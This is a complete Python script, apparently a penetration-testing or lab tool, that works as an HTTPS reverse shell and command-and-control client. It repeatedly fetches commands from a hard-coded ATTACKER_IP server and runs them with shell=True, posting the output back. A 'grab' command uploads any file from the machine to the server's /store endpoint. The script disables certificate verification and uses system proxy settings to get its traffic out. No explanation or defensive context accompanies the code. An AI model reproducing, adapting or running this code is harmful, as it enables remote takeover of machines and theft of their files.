from urllib import request, parse
import subprocess
import time
import os
from http.client import RemoteDisconnected
import ssl
import platform

ATTACKER_IP = '192.168.18.128'  # Change this to the attacker's IP address
HTTPS_PORT = 8443  # Change this to the HTTPS port if needed

# Function to detect the OS and check for proxy settings
def get_proxy_settings():
    os_type = platform.system()
    proxy = None

    if os_type == "Windows":
        # Check for proxy settings in the environment variables
        proxy = os.getenv('HTTP_PROXY') or os.getenv('http_proxy')
    elif os_type == "Linux" or os_type == "Darwin":  # Darwin is macOS
        # Check for proxy settings in the environment variables
        proxy = os.getenv('http_proxy') or os.getenv('https_proxy')
    
    return proxy

# Data is a dict
def send_post(data, url, verify_ssl=False, proxy=None):   # True
    data = {"rfile": data}
    data = parse.urlencode(data).encode()
    req = request.Request(url, data=data)
    
    # Create an SSL context
    context = ssl.create_default_context()
    
    # If verify_ssl is False, disable certificate verification
    if not verify_ssl:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

    # Set proxy if available
    if proxy:
        proxy_handler = request.ProxyHandler({'http': proxy, 'https': proxy})
        opener = request.build_opener(proxy_handler)
        request.install_opener(opener)

    try:
        request.urlopen(req, context=context)  # Send request
    except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
        print(f"Error sending data: {e}")
        print("Connection closed, exiting...")
        exit(1)

def send_file(command, proxy=None):
    try:
        grab, path = command.strip().split(' ')
    except ValueError:
        send_post("[-] Invalid grab command (maybe multiple spaces)", url=f'https://{ATTACKER_IP}:{HTTPS_PORT}/store', verify_ssl=True, proxy=proxy)
        return

    if not os.path.exists(path):
        send_post("[-] Not able to find the file", url=f'https://{ATTACKER_IP}:{HTTPS_PORT}/store', verify_ssl=True, proxy=proxy)
        return

    store_url = f'https://{ATTACKER_IP}:{HTTPS_PORT}/store'  # Posts to /store
    with open(path, 'rb') as fp:
        try:
            send_post(fp.read(), url=store_url, verify_ssl=False, proxy=proxy)  # True
        except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
            print(f"Error sending file: {e}")
            print("Connection closed, exiting...")
            exit(1)

def run_command(command, proxy=None):
    CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    send_post(CMD.stdout.read(), url=f'https://{ATTACKER_IP}:{HTTPS_PORT}', verify_ssl=False, proxy=proxy)  # True
    send_post(CMD.stderr.read(), url=f'https://{ATTACKER_IP}:{HTTPS_PORT}', verify_ssl=False, proxy=proxy)  # True

def connect_to_https_server(verify_ssl=False, proxy=None):  # True
    # Create an SSL context
    context = ssl.create_default_context()
    
    # If verify_ssl is False, disable certificate verification
    if not verify_ssl:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

    # Set proxy if available
    if proxy:
        proxy_handler = request.ProxyHandler({'http': proxy, 'https': proxy})
        opener = request.build_opener(proxy_handler)
        request.install_opener(opener)

    # Try connecting to the HTTPS server
    try:
        command = request.urlopen(f"https://{ATTACKER_IP}:{HTTPS_PORT}", context=context).read().decode()
        return command
    except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
        print(f"Error connecting to HTTPS server: {e}")
        return None

# Get proxy settings
proxy = get_proxy_settings()

# Example of how to use the modified function
while True:
    command = connect_to_https_server(verify_ssl=False, proxy=proxy)  # True
    
    # If connection fails
    if command is None:
        print("HTTPS server is down, exiting...")
        exit(1)

    if 'terminate' in command:
        break

    # Send file
    if 'grab' in command:
        send_file(command, proxy=proxy)
        continue

    run_command(command, proxy=proxy)
    time.sleep(1)
